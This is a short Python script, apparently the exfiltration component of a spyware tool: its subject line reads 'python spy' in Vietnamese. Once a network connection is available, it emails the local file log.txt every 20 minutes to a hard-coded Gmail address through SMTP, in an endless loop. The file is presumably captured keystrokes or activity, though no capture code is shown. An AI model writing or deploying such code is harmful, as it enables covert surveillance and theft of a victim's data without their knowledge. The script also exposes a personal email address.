import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from time import sleep
import os
import socket
import time

TIMEOUT_SECONDS = 40 # Thời gian chờ tối đa cho kết nối mạng
isConnected = True

def is_connected():
	try:
		# Kiểm tra kết nối tới máy chủ DNS của Google
		socket.create_connection(("8.8.8.8", 53), timeout=5)
		return True
	except:
		return False

def auto_email():
	smtp_server = "smtp.gmail.com"
	port = 587
	sender_email = "qbquangbinh@gmail.com"
	receiver_email = 'qbquangbinh@gmail.com'
	password = os.getenv("PASS_EMAIL")
	subject = "Gian diep python"
	body = "File log.txt co su thay doi"
	message = MIMEMultipart()
	message["From"] = sender_email
	message["To"] = receiver_email
	message["Subject"] = subject
	message.attach(MIMEText(body, "plain"))
	filename = "log.txt"
	with open(filename, "rb") as attachment:
		part = MIMEBase("application", "octet-stream")
		part.set_payload(attachment.read())
	encoders.encode_base64(part)
	part.add_header("Content-Disposition", f"attachment; filename = {filename}")
	message.attach(part)
	text = message.as_string()
	context = ssl.create_default_context()
	server = smtplib.SMTP(smtp_server, port)
	server.starttls(context=context)
	server.login(sender_email, password)
	server.sendmail(sender_email, receiver_email, text)
	attachment.close()
	server.quit()
	return

start = time.time()
while not is_connected():
	elapsed = time.time() - start
	if elapsed >= TIMEOUT_SECONDS:
		isConnected = False
		break
	print("Không có kết nối mạng. Đang chờ...")
	sleep(5)
if not isConnected:
	print(f"Không có kết nối mạng sau {TIMEOUT_SECONDS}s")
else:
	print("Đã kết nối mạng.")

if isConnected:
	while True:

		sleep(1200)
		auto_email()